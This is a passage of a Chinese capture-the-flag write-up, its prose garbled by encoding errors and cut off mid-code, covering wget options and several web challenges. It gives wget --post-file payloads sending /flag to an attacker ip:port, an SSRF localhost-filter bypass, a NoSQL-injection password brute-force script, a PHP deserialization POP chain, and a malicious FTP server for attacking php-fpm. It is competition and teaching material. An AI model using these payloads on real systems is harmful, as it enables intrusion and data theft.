--no-host-directories</td><td>ä¸è¦åˆ›å»ºä¸»ç›®å½•ã€‚</td></tr><tr><td>--protocol-directories</td><td>åœ¨ç›®å½•ä¸­ä½¿ç”¨åè®®åç§°ã€‚</td></tr><tr><td>-P, --directory-prefix=PREFIX</td><td>ä»¥ PREFIX/... ä¿å­˜æ–‡ä»¶</td></tr><tr><td>--cut-dirs=NUMBER</td><td>å¿½ç•¥è¿œç¨‹ç›®å½•ä¸­ NUMBER ä¸ªç›®å½•å±‚ã€‚</td></tr></tbody></table><p><strong>HTTP é€‰é¡¹ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>--http-user=USER</td><td>è®¾ç½® http ç”¨æˆ·åä¸º USERã€‚</td></tr><tr><td>--http-password=PASS</td><td>è®¾ç½® http å¯†ç ä¸º PASSã€‚</td></tr><tr><td>--no-cache</td><td>ä¸åœ¨æœåŠ¡å™¨ä¸Šç¼“å­˜æ•°æ®ã€‚</td></tr><tr><td>--default-page=NAME</td><td>æ”¹å˜é»˜è®¤é¡µ(é»˜è®¤é¡µé€šå¸¸æ˜¯â€œindex.htmlâ€)ã€‚</td></tr><tr><td>-E, --adjust-extension</td><td>ä»¥åˆé€‚çš„æ‰©å±•åä¿å­˜ HTML/CSS æ–‡æ¡£ã€‚</td></tr><tr><td>--ignore-length</td><td>å¿½ç•¥å¤´éƒ¨çš„â€˜Content-Lengthâ€™åŒºåŸŸã€‚</td></tr><tr><td>--header=STRING</td><td>åœ¨å¤´éƒ¨æ’å…¥ STRINGã€‚</td></tr><tr><td>--max-redirect</td><td>æ¯é¡µæ‰€å…è®¸çš„æœ€å¤§é‡å®šå‘ã€‚</td></tr><tr><td>--proxy-user=USER</td><td>ä½¿ç”¨ USER ä½œä¸ºä»£ç†ç”¨æˆ·åã€‚</td></tr><tr><td>--proxy-password=PASS</td><td>ä½¿ç”¨ PASS ä½œä¸ºä»£ç†å¯†ç ã€‚</td></tr><tr><td>--referer=URL</td><td>åœ¨ HTTP è¯·æ±‚å¤´åŒ…å«â€˜Referer: URLâ€™ã€‚</td></tr><tr><td>--save-headers</td><td>å°† HTTP å¤´ä¿å­˜è‡³æ–‡ä»¶ã€‚</td></tr><tr><td>-U, --user-agent=AGENT</td><td>æ ‡è¯†ä¸º AGENT è€Œä¸æ˜¯ Wget/VERSIONã€‚</td></tr><tr><td>--no-http-keep-alive</td><td>ç¦ç”¨ HTTP keep-alive (æ°¸ä¹…è¿æ¥)ã€‚</td></tr><tr><td>--no-cookies</td><td>ä¸ä½¿ç”¨ cookiesã€‚</td></tr><tr><td>--load-cookies=FILE</td><td>ä¼šè¯å¼€å§‹å‰ä» FILE ä¸­è½½å…¥ cookiesã€‚</td></tr><tr><td>--save-cookies=FILE</td><td>ä¼šè¯ç»“æŸåä¿å­˜ cookies è‡³ FILEã€‚</td></tr><tr><td>--keep-session-cookies</td><td>è½½å…¥å¹¶ä¿å­˜ä¼šè¯ (éæ°¸ä¹…) cookiesã€‚</td></tr><tr><td>--post-data=STRING</td><td>ä½¿ç”¨ POST æ–¹å¼ï¼›æŠŠ STRING ä½œä¸ºæ•°æ®å‘é€ã€‚</td></tr><tr><td>--post-file=FILE</td><td>ä½¿ç”¨ POST æ–¹å¼ï¼›å‘é€ FILE å†…å®¹ã€‚</td></tr><tr><td>--method=HTTPMethod</td><td>use method &quot;HTTPMethod&quot; in the header.</td></tr><tr><td>--body-data=STRING</td><td>Send STRING as data. --method MUST be set.</td></tr><tr><td>--body-file=FILE</td><td>Send contents of FILE. --method MUST be set.</td></tr><tr><td>--content-disposition</td><td>å½“é€‰ä¸­æœ¬åœ°æ–‡ä»¶åæ—¶å…è®¸ Content-Disposition å¤´éƒ¨ (å°šåœ¨å®éªŒ)ã€‚</td></tr><tr><td>--content-on-error</td><td>output the received content on server errors.</td></tr><tr><td>--auth-no-challenge</td><td>å‘é€ä¸å«æœåŠ¡å™¨è¯¢é—®çš„é¦–æ¬¡ç­‰å¾…çš„åŸºæœ¬ HTTP éªŒè¯ä¿¡æ¯ã€‚</td></tr></tbody></table><p><strong>HTTPS (SSL/TLS) é€‰é¡¹ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>--secure-protocol=PR</td><td>choose secure protocol, one of auto, SSLv2,SSLv3, TLSv1 and PFS.</td></tr><tr><td>--https-only</td><td>only follow secure HTTPS links</td></tr><tr><td>--no-check-certificate</td><td>ä¸è¦éªŒè¯æœåŠ¡å™¨çš„è¯ä¹¦ã€‚</td></tr><tr><td>--certificate=FILE</td><td>å®¢æˆ·ç«¯è¯ä¹¦æ–‡ä»¶ã€‚</td></tr><tr><td>--certificate-type=TYPE</td><td>å®¢æˆ·ç«¯è¯ä¹¦ç±»å‹ï¼ŒPEM æˆ– DERã€‚</td></tr><tr><td>--private-key=FILE</td><td>ç§é’¥æ–‡ä»¶ã€‚</td></tr><tr><td>--private-key-type=TYPE</td><td>ç§é’¥æ–‡ä»¶ç±»å‹ï¼ŒPEM æˆ– DERã€‚</td></tr><tr><td>--ca-certificate=FILE</td><td>å¸¦æœ‰ä¸€ç»„ CA è®¤è¯çš„æ–‡ä»¶ã€‚</td></tr><tr><td>--ca-directory=DIR</td><td>ä¿å­˜ CA è®¤è¯çš„å“ˆå¸Œåˆ—è¡¨çš„ç›®å½•ã€‚</td></tr><tr><td>--random-file=FILE</td><td>å¸¦æœ‰ç”Ÿæˆ SSL PRNG çš„éšæœºæ•°æ®çš„æ–‡ä»¶ã€‚</td></tr><tr><td>--egd-file=FILE</td><td>ç”¨äºå‘½åå¸¦æœ‰éšæœºæ•°æ®çš„ EGD å¥—æ¥å­—çš„æ–‡ä»¶ã€‚</td></tr></tbody></table><p><strong>FTP é€‰é¡¹ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>--ftp-user=USER</td><td>è®¾ç½® ftp ç”¨æˆ·åä¸º USERã€‚</td></tr><tr><td>--ftp-password=PASS</td><td>è®¾ç½® ftp å¯†ç ä¸º PASSã€‚</td></tr><tr><td>--no-remove-listing</td><td>ä¸è¦åˆ é™¤â€˜.listingâ€™æ–‡ä»¶ã€‚</td></tr><tr><td>--no-glob</td><td>ä¸åœ¨ FTP æ–‡ä»¶åä¸­ä½¿ç”¨é€šé…ç¬¦å±•å¼€ã€‚</td></tr><tr><td>--no-passive-ftp</td><td>ç¦ç”¨â€œpassiveâ€ä¼ è¾“æ¨¡å¼ã€‚</td></tr><tr><td>--preserve-permissions</td><td>ä¿ç•™è¿œç¨‹æ–‡ä»¶çš„æƒé™ã€‚</td></tr><tr><td>--retr-symlinks</td><td>é€’å½’ç›®å½•æ—¶ï¼Œè·å–é“¾æ¥çš„æ–‡ä»¶ (è€Œéç›®å½•)ã€‚</td></tr></tbody></table><p><strong>WARC é€‰é¡¹ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>--warc-file=FILENAME</td><td>save request/response data to a .warc.gz file.</td></tr><tr><td>--warc-header=STRING</td><td>insert STRING into the warcinfo record.</td></tr><tr><td>--warc-max-size=NUMBER</td><td>set maximum size of WARC files to NUMBER.</td></tr><tr><td>--warc-cdx</td><td>write CDX index files.</td></tr><tr><td>--warc-dedup=FILENAME</td><td>do not store records listed in this CDX file.</td></tr><tr><td>--no-warc-compression</td><td>do not compress WARC files with GZIP.</td></tr><tr><td>--no-warc-digests</td><td>do not calculate SHA1 digests.</td></tr><tr><td>--no-warc-keep-log</td><td>do not store the log file in a WARC record.</td></tr><tr><td>--warc-tempdir=DIRECTORY</td><td>location for temporary files created by the WARC writer.</td></tr></tbody></table><p><strong>é€’å½’ä¸‹è½½ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-r, --recursive</td><td>æŒ‡å®šé€’å½’ä¸‹è½½ã€‚</td></tr><tr><td>-l, --level=NUMBER</td><td>æœ€å¤§é€’å½’æ·±åº¦ (inf æˆ– 0 ä»£è¡¨æ— é™åˆ¶ï¼Œå³å…¨éƒ¨ä¸‹è½½)ã€‚</td></tr><tr><td>--delete-after</td><td>ä¸‹è½½å®Œæˆååˆ é™¤æœ¬åœ°æ–‡ä»¶ã€‚</td></tr><tr><td>-k, --convert-links</td><td>è®©ä¸‹è½½å¾—åˆ°çš„ HTML æˆ– CSS ä¸­çš„é“¾æ¥æŒ‡å‘æœ¬åœ°æ–‡ä»¶ã€‚</td></tr><tr><td>--backups=N</td><td>before writing file X, rotate up to N backup files.</td></tr><tr><td>-K, --backup-converted</td><td>åœ¨è½¬æ¢æ–‡ä»¶ X å‰å…ˆå°†å®ƒå¤‡ä»½ä¸º X.origã€‚</td></tr><tr><td>-m, --mirror</td><td>-N -r -l inf --no-remove-listing çš„ç¼©å†™å½¢å¼ã€‚</td></tr><tr><td>-p, --page-requisites</td><td>ä¸‹è½½æ‰€æœ‰ç”¨äºæ˜¾ç¤º HTML é¡µé¢çš„å›¾ç‰‡ä¹‹ç±»çš„å…ƒç´ ã€‚</td></tr><tr><td>--strict-comments</td><td>ç”¨ä¸¥æ ¼æ–¹å¼ (SGML) å¤„ç† HTML æ³¨é‡Šã€‚</td></tr></tbody></table><p><strong>é€’å½’æ¥å—/æ‹’ç»ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-A, --accept=LIST</td><td>é€—å·åˆ†éš”çš„å¯æ¥å—çš„æ‰©å±•ååˆ—è¡¨ã€‚</td></tr><tr><td>-R, --reject=LIST</td><td>é€—å·åˆ†éš”çš„è¦æ‹’ç»çš„æ‰©å±•ååˆ—è¡¨ã€‚</td></tr><tr><td>--accept-regex=REGEX</td><td>regex matching accepted URLs.</td></tr><tr><td>--reject-regex=REGEX</td><td>regex matching rejected URLs.</td></tr><tr><td>--regex-type=TYPE</td><td>regex type (posix).</td></tr><tr><td>-D, --domains=LIST</td><td>é€—å·åˆ†éš”çš„å¯æ¥å—çš„åŸŸåˆ—è¡¨ã€‚</td></tr><tr><td>--exclude-domains=LIST</td><td>é€—å·åˆ†éš”çš„è¦æ‹’ç»çš„åŸŸåˆ—è¡¨ã€‚</td></tr><tr><td>--follow-ftp</td><td>è·Ÿè¸ª HTML æ–‡æ¡£ä¸­çš„ FTP é“¾æ¥ã€‚</td></tr><tr><td>--follow-tags=LIST</td><td>é€—å·åˆ†éš”çš„è·Ÿè¸ªçš„ HTML æ ‡è¯†åˆ—è¡¨ã€‚</td></tr><tr><td>--ignore-tags=LIST</td><td>é€—å·åˆ†éš”çš„å¿½ç•¥çš„ HTML æ ‡è¯†åˆ—è¡¨ã€‚</td></tr><tr><td>-H, --span-hosts</td><td>é€’å½’æ—¶è½¬å‘å¤–éƒ¨ä¸»æœºã€‚</td></tr><tr><td>-L, --relative</td><td>åªè·Ÿè¸ªæœ‰å…³ç³»çš„é“¾æ¥ã€‚</td></tr><tr><td>-I, --include-directories=LIST</td><td>å…è®¸ç›®å½•çš„åˆ—è¡¨ã€‚</td></tr><tr><td>--trust-server-names</td><td>use the name specified by the redirection url last component.</td></tr><tr><td>-X, --exclude-directories=LIST</td><td>æ’é™¤ç›®å½•çš„åˆ—è¡¨ã€‚</td></tr><tr><td>-np, --no-parent</td><td>ä¸è¿½æº¯è‡³çˆ¶ç›®å½•ã€‚</td></tr></tbody></table></blockquote><p>è¿˜å¯ä»¥åˆ©ç”¨wgetè¿›è¡Œä¸€äº›å‘½ä»¤å¤–å¸¦</p><p><a href="https://blog.csdn.net/weixin_39696665/article/details/110465937"> -bash: wget: æœªæ‰¾åˆ°å‘½ä»¤_åˆ©ç”¨å‘½ä»¤æ³¨å…¥å¤–å¸¦æ•°æ®çš„ä¸€äº›å§¿åŠ¿_weixin_39696665çš„åšå®¢-CSDNåšå®¢</a></p><h3 id="ä¸€-ç›´æ¥ä½¿ç”¨wget"><a href="#ä¸€-ç›´æ¥ä½¿ç”¨wget" class="headerlink" title="ä¸€.ç›´æ¥ä½¿ç”¨wget"></a>ä¸€.ç›´æ¥ä½¿ç”¨wget</h3><p>è¿™é‡Œæˆ‘ä»¬å°±åˆ©ç”¨äº†<code>â€“post-file</code>å®ç°å¯¹flagæ–‡ä»¶ä¸Šä¼ åˆ°æˆ‘ä»¬è‡ªå·±æœåŠ¡å™¨ä¸Šçš„æ“ä½œ<code>wget --post-file /flag http://ip:port</code></p><p>å› ä¸ºæ ¹æ®ä»£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512231220147.png" alt="image-20220512231220147"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä»æ•°ç»„ç¬¬äºŒä¸ªå¼€å§‹å–ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ˜¯ä»€ä¹ˆéƒ½æ— æ‰€è°“ï¼Œæˆ‘ä»¬è¦æ„é€ çš„payloadè¦ä»ç¬¬äºŒä¸ªå¼€å§‹</p><p>payload</p><p><code>/wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://ip:port/</code></p><p>åœ¨å°±ç›¸å½“äºå°†/flagé‡Œçš„å†…å®¹ä¸Šä¼ åˆ°æˆ‘ä»¬æœåŠ¡å™¨çš„è¿™ä¸ªç«¯å£ä¸Šï¼Œåªè¦æˆ‘ä»¬åœ¨æœåŠ¡å™¨ä¸Šç›‘å¬è¿™ä¸ªç«¯å£ï¼Œå°±èƒ½çœ‹åˆ°ä¸Šä¼ çš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512230723967.png" alt="image-20220512230723967"></p><h3 id="äºŒ-ä½¿ç”¨proxyè¿›è¡Œssrf"><a href="#äºŒ-ä½¿ç”¨proxyè¿›è¡Œssrf" class="headerlink" title="äºŒ.ä½¿ç”¨proxyè¿›è¡Œssrf"></a>äºŒ.ä½¿ç”¨proxyè¿›è¡Œssrf</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512231839155.png" alt="image-20220512231839155"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ä¸ä»…ä»…æ˜¯<code>--post-file</code>å¯ä»¥ä¼ è¾“æ–‡ä»¶ï¼Œ<code>--body-file</code>åŒæ ·å¯ä»¥ï¼Œåªæ˜¯éœ€è¦æŒ‡å®šmethod</p><p>æ‰€ä»¥<code>/wget?argv=2&amp;argv=--body-file&amp;argv=/flag&amp;argv=--method=POST&amp;argv=http://ip:port/</code>åŒæ ·å¯ä»¥</p><p>å½“ç„¶è¿™ä¸ªä¸æ˜¯æˆ‘ä»¬çš„ssrf</p><p>ssrfåœ¨/proxyè·¯ç”±é‡Œ</p><pre class="language-go" data-language="go"><code class="language-go">func proxyController(c *gin.Context) &#123;        var url Url    if err :&#x3D; c.ShouldBindJSON(&amp;url); err !&#x3D; nil &#123;        c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;)        return    &#125;        re :&#x3D; regexp.MustCompile(&quot;127.0.0.1|0.0.0.0|06433|0x|0177|localhost|ffff&quot;)    if re.MatchString(url.Url) &#123;        c.JSON(403, gin.H&#123;&quot;msg&quot;: &quot;Url Forbidden&quot;&#125;)        return    &#125;        client :&#x3D; &amp;http.Client&#123;Timeout: 2 * time.Second&#125;    resp, err :&#x3D; client.Get(url.Url)    if err !&#x3D; nil &#123;        c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)        return    &#125;    defer resp.Body.Close()    var buffer [512]byte    result :&#x3D; bytes.NewBuffer(nil)    for &#123;        n, err :&#x3D; resp.Body.Read(buffer[0:])        result.Write(buffer[0:n])        if err !&#x3D; nil &amp;&amp; err &#x3D;&#x3D; io.EOF &#123;            break        &#125; else if err !&#x3D; nil &#123;            c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)            return        &#125;    &#125;    c.JSON(http.StatusOK, gin.H&#123;&quot;data&quot;: result.String()&#125;)&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512232424874.png" alt="image-20220512232424874"></p><p>è¿™å—ä¸€çœ‹å°±åƒä¸ºäº†é˜²æ­¢ssrfæ‰å†™å‡ºæ¥çš„ï¼Œï¼ˆè™½ç„¶æˆ‘æ²¡çœ‹å‡ºæ¥ssrfæ¼æ´åœ¨å“ªï¼Œåœ¨æˆ‘çœ‹æ¥è¿™è¿˜æ˜¯åˆ©ç”¨äº†wget</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨<code>[::]</code>ç»•è¿‡å¯¹127.0.0.1çš„é™åˆ¶ç„¶åè®¿é—®å†…ç½‘</p><p>å¹¶ä¸”wgetè·¯ç”±å¯ä»¥ç”¨æ¥å‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¼ å…¥æ¶æ„çš„å‚æ•°æ¥è·å–æœåŠ¡å™¨ä¸Šæ–‡ä»¶å¹¶ä¸”å¤–å¸¦å‡ºæ¥ï¼Œæœ€ç»ˆçš„payloadï¼ˆæ³¨æ„postå‘åŒ…æ”¹ä¸ºapplication/jsonæ ¼å¼ï¼‰</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;[::]:8080&#x2F;wget?argv&#x3D;-e+http_proxy&#x3D;http:&#x2F;&#x2F;ip:port&amp;argv&#x3D;--method&#x3D;POST&amp;argv&#x3D;--body-file&#x3D;&#x2F;flag&amp;argv&#x3D;http:&#x2F;&#x2F;ip:port&quot;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220512232841863.png" alt="image-20220512232841863"></p><p>å°tipsï¼š</p><p>è¿™ä¸ªpayloadé‡Œ<code>-e &quot;http_proxy=porxyhost:port&quot;</code>è¿™éƒ¨åˆ†æ˜¯åˆ©ç”¨<code>wget -e &quot;http_proxy=porxyhost:port&quot; www.baidu.com</code>çš„å½¢å¼è·å¾—ä»£ç†è®¾ç½®çš„å‘½ä»¤ï¼Œä½†å®é™…ä¸Šæ ¹æœ¬ç”¨ä¸åˆ°ï¼Œå› ä¸ºargvå‚æ•°ä»ç¬¬äºŒä¸ªå¼€å§‹å–</p><p>é¡ºå¸¦æä¸€ä¸‹å¦‚æœæ˜¯curlå‘½ä»¤å°±è¦ç”¨<code>curl -x proxyhost:port www.baidu.com</code>è¿™ç§å½¢å¼</p><h3 id="ä¸‰-nosqlæ³¨å…¥"><a href="#ä¸‰-nosqlæ³¨å…¥" class="headerlink" title="ä¸‰.nosqlæ³¨å…¥"></a>ä¸‰.nosqlæ³¨å…¥</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513122251311.png" alt="image-20220513122251311"></p><p>è¿™é‡Œå­˜åœ¨nosqlæ³¨å…¥</p><p>æ‰€ä»¥å¯ä»¥æ ¹æ®è¿™ä¸ªè·å–adminçš„å¯†ç ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><p>è„šæœ¬ä¸­ä½¿ç”¨//å°†è¯¥è¡Œä¹‹åçš„ä»£ç è¿›è¡Œæ³¨é‡Šï¼Œå¹¶ä¸”é€šè¿‡è¡¥å…¨ä»£ç ä½¿å¾—ä»£ç å®Œæ•´<br>ä»£ç ä¸­åˆ¤æ–­æ˜¯å¦æˆåŠŸç”¨çš„æ˜¯Pretendå­—ç¬¦ä¸²ï¼Œæ ¹æ®æºç ï¼Œå¦‚æœç”¨æˆ·ååç§°å’Œå¯†ç åˆ¤æ–­ä¸æ­£ç¡®ï¼Œå°±ä¼šè¿”å›å«æœ‰Pretendçš„å­—ç¬¦ä¸²</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;47.117.125.220:8081&#x2F;login&quot;#è‡ªè¡Œä¿®æ”¹headers &#x3D; &#123;    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;strings &#x3D; &quot;1234567890abcdefghijklmnopqrstuvwxyz&quot;res &#x3D; &quot;&quot;#resé•¿åº¦ä»0å¼€å§‹for i in range(len(res) + 1, 40):    if len(res) &#x3D;&#x3D; i - 1:        for c in strings:            data &#x3D; &#123;                #æ³¨æ„è¿™ä¸ªsubstrç”¨çš„æ˜¯-å·ï¼Œæ˜¯åå‘è¯»å–å¯†ç çš„ï¼Œåå‘é€ä¸ªè¯»å–å¯†ç ï¼Œç„¶åå¯¹æ¯”                &quot;username&quot;: &quot;admin&#39;&amp;&amp;this.password.substr(-&quot; + str(i) + &quot;)&#x3D;&#x3D;&#39;&quot; + str(c + res) + &quot;&#39;) &#123;return true;&#125;&#125;)&#x2F;&#x2F;&quot;,                &quot;password&quot;: &quot;123456&quot;            &#125;            r &#x3D; requests.post(url&#x3D;url, headers&#x3D;headers, data&#x3D;data)            if &quot;Pretend&quot; in r.text:                res &#x3D; c + res                print(&quot;[+] &quot; + res)                break    else:        print(&quot;[-] Failed&quot;)        break</code></pre><p>ä¸è¿‡æ²¡å•¥ç”¨ï¼Œå°±ç®—æ˜¯adminç™»å½•äº†ä¹Ÿæ²¡flag</p><h2 id="eaaasyphp"><a href="#eaaasyphp" class="headerlink" title="eaaasyphp"></a>eaaasyphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Check &#123;    public static $str1 &#x3D; false;    public static $str2 &#x3D; false;&#125;class Esle &#123;    public function __wakeup()    &#123;        Check::$str1 &#x3D; true;    &#125;&#125;class Hint &#123;    public function __wakeup()&#123;        $this-&gt;hint &#x3D; &quot;no hint&quot;;    &#125;    public function __destruct()&#123;        if(!$this-&gt;hint)&#123;            $this-&gt;hint &#x3D; &quot;phpinfo&quot;;            ($this-&gt;hint)();        &#125;      &#125;&#125;class Bunny &#123;    public function __toString()    &#123;        if (Check::$str2) &#123;            if(!$this-&gt;data)&#123;                $this-&gt;data &#x3D; $_REQUEST[&#39;data&#39;];            &#125;            file_put_contents($this-&gt;filename, $this-&gt;data);        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;    &#125;&#125;class Welcome &#123;    public function __invoke()    &#123;        Check::$str2 &#x3D; true;        return &quot;Welcome&quot; . $this-&gt;username;    &#125;&#125;class Bypass &#123;    public function __destruct()    &#123;        if (Check::$str1) &#123;            ($this-&gt;str4)();        &#125; else &#123;            throw new Error(&quot;Error&quot;);        &#125;    &#125;&#125;if (isset($_GET[&#39;code&#39;])) &#123;    unserialize($_GET[&#39;code&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;</code></pre><p>è¿™é‡Œæœ‰file_put_contentsï¼Œæ–‡ä»¶åå’Œå†…å®¹éƒ½å¯æ§ï¼Œå¯ä»¥è¯•è¯•å†™é©¬ï¼Œä½†æ˜¯è¿™é‡Œåšäº†æƒé™æ§åˆ¶ï¼Œå†™ä¸äº†</p><p>ç„¶åçœ‹åˆ°æœ‰hintç±»ï¼Œé‡Œé¢èƒ½è®¿é—®phpinfoå°è¯•å»ååºåˆ—åŒ–æ‰§è¡Œè¿™ä¸ªç±»ï¼Œç»•è¿‡wakeupæˆ‘ä»¬é‡‡ç”¨å¸¸ç”¨çš„ä¿®æ”¹æ–¹å¼</p><pre class="language-txt" data-language="txt"><code class="language-txt">O:4:&quot;Hint&quot;:0:&#123;&#125;&#x3D;&gt;O:4:&quot;Hint&quot;:1:&#123;&#125;</code></pre><p>å‘ç°å¹¶æ²¡æœ‰æ‰§è¡Œï¼Œå› ä¸ºwakeupçš„ç»•è¿‡åœ¨é«˜ç‰ˆæœ¬è¢«ä¿®å¤äº†ï¼Œè¿™é‡Œå®˜æ–¹ç»™äº†ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç»•è¿‡<a href="https://bugs.php.net/bug.php?id=81151">https://bugs.php.net/bug.php?id=81151</a></p><p>å°†Oæ”¹æˆCå°±èƒ½æˆåŠŸç»•è¿‡ï¼Œè®¿é—®phpinfoï¼Œæ”¹æˆè´Ÿæ•°å¥½åƒä¹Ÿå¯ä»¥</p><p>é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥åˆ©ç”¨bypassç±»æ¥è®¿é—®phpinfo</p><pre class="language-php" data-language="php"><code class="language-php">class Bypass &#123;    public function __construct()    &#123;        $this-&gt;test &#x3D; new Esle();        $this-&gt;str4 &#x3D; &#39;phpinfo&#39;;    &#125;&#125;$a &#x3D; new Bypass();echo serialize($a);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513124945406.png" alt="image-20220513124945406"></p><p>åœ¨phpinfoé‡Œå‘ç°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513125309445.png" alt="image-20220513125309445"></p><p>é‚£åº”è¯¥å°±æ˜¯åˆ©ç”¨ftp(æ–‡ä»¶ä¼ è¾“åè®®)çš„è¢«åŠ¨æ¨¡å¼æ‰“php-fpm9000ç«¯å£äº†</p><h3 id="FTPçš„è¢«åŠ¨æ¨¡å¼æ‰“php-fpm"><a href="#FTPçš„è¢«åŠ¨æ¨¡å¼æ‰“php-fpm" class="headerlink" title="FTPçš„è¢«åŠ¨æ¨¡å¼æ‰“php-fpm"></a>FTPçš„è¢«åŠ¨æ¨¡å¼æ‰“php-fpm</h3><p>FTP åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼šå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–/å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–åˆ°ä¸€ä¸ªæŒ‡å®šçš„IPå’Œç«¯å£ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šåˆ°127.0.0.1:9000ï¼Œè¿™æ ·å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºæœ¬åœ°çš„ PHP-FPM å‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆSSRF</p><p>åŸç†ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513131104286.png" alt="image-20220513131104286"></p><p>è¿™é‡Œè¦å…ˆåœ¨vpsä¸Šæ­ä¸€ä¸ªæ¶æ„çš„ftpæœåŠ¡</p><pre class="language-python" data-language="python"><code class="language-python"># evil_ftp.pyimport sockets &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#39;0.0.0.0&#39;, 5002))s.listen(1)conn, addr &#x3D; s.accept()conn.send(b&#39;220 welcome\n&#39;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#39;331 Please specify the password.\n&#39;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#39;230 Login successful.\n&#39;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#39;200 Switching to Binary mode.\n&#39;)#Size &#x2F;conn.send(b&#39;550 Could not get the file size.\n&#39;)#EPSV (1)conn.send(b&#39;150 ok\n&#39;)#PASVconn.send(b&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#39;) #STOR &#x2F; (2)conn.send(b&#39;150 Permission denied.\n&#39;)#QUITconn.send(b&#39;221 Goodbye.\n&#39;)conn.close()</code></pre><p>ç„¶ååˆ©ç”¨gopherusç”Ÿæˆæ‰“fastcgiçš„payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513135948923.png" alt="image-20220513135948923"></p><p>æˆ‘ä»¬åªè¦9000/_åè¾¹çš„éƒ¨åˆ†</p><p>æœ€åå°±æ˜¯æ„é€ popé“¾è°ƒç”¨file_put_contents</p><p>è¿™é‡Œæœ‰å‡ ä¸ªé­”æœ¯æ–¹æ³•</p><pre class="language-txt" data-language="txt"><code class="language-txt">__wakeup():å½“è°ƒç”¨unserializeæ—¶è§¦å‘__toString():å½“ç±»è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶è°ƒç”¨__invoke():å½“æŠŠç±»å½“ä½œå‡½æ•°å¤„ç†æ—¶è°ƒç”¨</code></pre><p>popé“¾</p><pre class="language-php" data-language="php"><code class="language-php">class Check &#123;    public static $str1 &#x3D; ture;    public static $str2 &#x3D; &#39;phpinfo&#39;;&#125;class Esle &#123;    public function __wakeup()    &#123;        Check::$str1 &#x3D; true;    &#125;&#125;class Hint &#123;    public function __wakeup()&#123;        $this-&gt;hint &#x3D; &quot;no hint&quot;;    &#125;    public function __destruct()&#123;        if(!$this-&gt;hint)&#123;            $this-&gt;hint &#x3D; &quot;phpinfo&quot;;            ($this-&gt;hint)();        &#125;    &#125;&#125;class Bunny &#123;    public function __construct()&#123;        $this-&gt;filename 